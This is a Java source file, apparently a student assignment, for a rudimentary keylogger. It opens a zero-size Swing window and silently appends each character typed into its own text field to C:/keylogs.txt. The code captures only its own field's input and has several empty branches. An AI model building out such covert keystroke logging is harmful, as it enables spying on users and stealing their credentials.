package assignments.chapter5;

import java.awt.event.KeyEvent;
import java.awt.event.KeyListener;
import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.IOException;
import java.io.PrintWriter;

import javax.swing.JFrame;
import javax.swing.JTextField;

public class BadKeyLogger {

	public static void main(String[] args) throws IOException {

		JFrame aWindow = new JFrame("KeyLogger");

		aWindow.setBounds(0, 0, 0, 0);
		aWindow.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);

		JTextField typingArea = new JTextField(20);
		typingArea.addKeyListener(new KeyListener() {

			public void files(String s) {
				try (PrintWriter o = new PrintWriter(
						new BufferedWriter(new FileWriter("C:/keylogs.txt", true)))) {
					o.print(s);
				} catch (IOException e) {
					e.printStackTrace();
				}
			}

			public void keyTyped(KeyEvent e) {
				displayInfo(e, "KEY TYPED: ");
			}

			public void keyPressed(KeyEvent e) {
				// displayInfo(e, "KEY PRESSED: ");
			}

			public void keyReleased(KeyEvent e) {
				// displayInfo(e, "KEY RELEASED: ");
			}

			protected void displayInfo(KeyEvent e, String s) {
				String tmpString;
				String keyString;
				int id = e.getID();
				if (id == KeyEvent.KEY_TYPED) {
					char c = e.getKeyChar();

					keyString = String.valueOf(c);
				} else {
					int keyCode = e.getKeyCode();
					keyString = "key code = " + keyCode + " (" + KeyEvent.getKeyText(keyCode) + ")";
				}

				int modifiers = e.getModifiersEx();
				tmpString = KeyEvent.getModifiersExText(modifiers);
				if (tmpString.length() > 0) {
				} else {
				}

				if (e.isActionKey()) {
				} else {
				}

				int location = e.getKeyLocation();
				if (location == KeyEvent.KEY_LOCATION_STANDARD) {
				} else if (location == KeyEvent.KEY_LOCATION_LEFT) {
				} else if (location == KeyEvent.KEY_LOCATION_RIGHT) {
				} else if (location == KeyEvent.KEY_LOCATION_NUMPAD) {
				} else { // (location == KeyEvent.KEY_LOCATION_UNKNOWN)

				}
				// System.out.println(keyString);

				// System.out.println(modString);
				// System.out.println(actionString);
				// System.out.println(locationString);
				files(keyString);

			}

		});

		aWindow.add(typingArea);
		aWindow.setVisible(true);

	}
}